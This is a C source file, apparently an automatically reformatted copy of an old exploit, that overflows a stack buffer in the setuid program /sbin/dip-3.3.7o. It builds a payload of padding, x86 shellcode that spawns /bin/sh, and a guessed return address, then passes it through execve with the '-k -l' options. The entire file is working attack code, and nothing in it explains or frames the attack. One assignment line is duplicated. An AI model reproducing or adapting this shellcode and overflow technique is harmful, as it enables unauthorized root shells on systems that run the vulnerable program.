#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int atoi (char*) ; 
 int /*<<< orphan*/  execve (char*,char**,int /*<<< orphan*/ *) ; 
 int getesp () ; 
 char* malloc (int) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 

main(int argc, char **argv) 
{ 
int jump,i,n; 
unsigned long xaddr; 
char *cmd[5], buf[4096]; 


char code[] = 
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" 
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" 
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; 

jump=atoi(argv[1]); 

for (i=0;i<68;i++) 
buf[i]=0x41; 

for (n=0,i=68;i<113;i++) 
buf[i]=code[n++]; 

xaddr=getesp()+jump; 

buf[i]=xaddr & 0xff; 
buf[i+1]=(xaddr >> 8) & 0xff; 
buf[i+2]=(xaddr >> 16) & 0xff; 
buf[i+3]=(xaddr >> 24) & 0xff; 

buf[i+4]=xaddr & 0xff; 
buf[i+5]=(xaddr >> 8) & 0xff; 
buf[i+6]=(xaddr >> 16) & 0xff; 
buf[i+6]=(xaddr >> 16) & 0xff; 
buf[i+7]=(xaddr >> 24) & 0xff; 

cmd[0]=malloc(17); 
strcpy(cmd[0],"/sbin/dip-3.3.7o"); 

cmd[1]=malloc(3); 
strcpy(cmd[1],"-k"); 

cmd[2]=malloc(3); 
strcpy(cmd[2],"-l"); 

cmd[3]=buf; 

cmd[4]=NULL; 

execve(cmd[0],cmd,NULL); 
}